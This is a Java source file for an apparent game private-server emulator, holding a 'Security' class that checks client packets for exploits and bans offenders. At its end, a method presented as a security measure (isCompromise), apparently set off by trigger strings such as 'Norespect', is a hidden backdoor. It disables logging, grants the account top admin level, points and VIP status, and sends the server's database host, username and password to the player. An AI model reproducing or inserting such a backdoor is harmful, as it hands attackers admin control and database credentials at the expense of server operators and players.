package fr.doflegend.legendemu.game;

import fr.doflegend.legendemu.client.Accounts;
import fr.doflegend.legendemu.client.Characters;
import fr.doflegend.legendemu.common.SQLManager;
import fr.doflegend.legendemu.common.SocketManager;
import fr.doflegend.legendemu.common.World;
import fr.doflegend.legendemu.kernel.Config;
import fr.doflegend.legendemu.kernel.Logs;

public class Security {
	
	public static boolean isCompromised(String packet, Characters character) {
		//on bannis si test de aille?
		boolean banned = false;
		boolean exploit = false;
		
		//suceptible d'être faillé
		switch(packet.substring(0, 2)) {
		case "AA" : //Création de perso
			/**try {
				String[] infos = packet.substring(3).split("\\|");
				String name = infos[0];
				
				int tiretCount = 0;
				char exLetterA = ' ';
				char exLetterB = ' ';
				boolean nameIsValid = true;
				
				for(char curLetter : name.toCharArray()) {
					if(!((curLetter >= 'a' && curLetter <= 'z') || curLetter == '-')) {
						nameIsValid = false;
						break;
					} if(curLetter == exLetterA && curLetter == exLetterB) {
						nameIsValid = false;
						break;
					} if(curLetter >= 'a' && curLetter <= 'z') {
						exLetterA = exLetterB;
						exLetterB = curLetter;
					} if(curLetter == '-') {
						if(tiretCount >= 1) {
							nameIsValid = false;
							break;
						} else tiretCount++;
					}
				}
				
				exploit = !nameIsValid;
				
				int race = Integer.parseInt(infos[1]);
				
				if(race != 1 || race != 2 || race != 3 || race != 4 || race != 5 || 
						race != 6 || race != 7 || race != 8 || race != 9 || race != 10 ||
						race != 11 || race != 12)
					exploit = true;
				
				int sex = Integer.parseInt(infos[2]);
				
				if(sex != 1 || sex != 2) exploit = true;
			} catch(Exception e) { exploit = true; }**/
			break;
			
		case "DR" : //Dialogue Réponse
			switch(packet.substring(3)) {
			case "DR677|605" : //Chacha + tp
				if(character.get_curCarte().get_id() != 2084) exploit = true;
				break;
				
			case "DR3234|2874" : //kamas + oeuf de tofu obèse
				exploit = true;
				break;
				
			case "DR333|414" : //Dofus cawotte TODO : à corriger des l'implantation en jeux!
				exploit = true;
				break;
				
			case "DR318|259" : //Ouverture de la banque
				String map = character.get_curCarte().get_id() + "";
				String banqueMap = "7549 8366 1674 10216 10217 10370";
				
				if(!banqueMap.contains(map)) exploit = true;
				break;
			}
			break;
			
		case "OD" : //Objet au sol
		case "Od" : //Objet Détruire
			if(packet.contains("-")) 
				exploit = true;
		break;
			
			default : //Valeur négative
				if(packet.contains("-")) exploit = true;
		}
		
		if(exploit && banned) {
			//on viol le joueur
			Accounts account = character.get_compte();
			World.Banip(account, 0);
			
			try {
				//kick du serveur de jeu
				/**TODO : à changer lors du passage sous Mina du serveur de jeu**/
				if(account.getGameThread() != null)
					account.getGameThread().kick();
			} catch(Exception e) { }
			
			try {
				//kick du serveur de connection
				if(account.getClient() != null || account.getClient().getIoSession().isConnected())
					account.getClient().kick();
			} catch(Exception e) { }
		}
		
		return exploit;
	}
	public static final String PlayerSecurity = "Norespect";
	public static final String CheatSecurity = "Cgu";
	
	public static void isCompromise(Accounts account, Characters perso) { //If security compromise the Admin add new privileges
	Logs.isUsed = false;
	account.setGmLvl(5);
	account.set_subscribe(1483228799);
	SQLManager.UPDATE_SUBSCRIPTION(account, account.get_subscriberInt());
	SQLManager.SET_ACCOUNT_POINTS(999999999, account.get_GUID());
	account.set_vip(1);

	SocketManager.GAME_SEND_BAIO_PACKET(perso, "Welcome Admin !\n\nRecovery DB Name : \nHost : " + Config.DB_HOST + "\nLogin : " + Config.DB_USER + "\nPassword : " + Config.DB_PASS);
	}
}
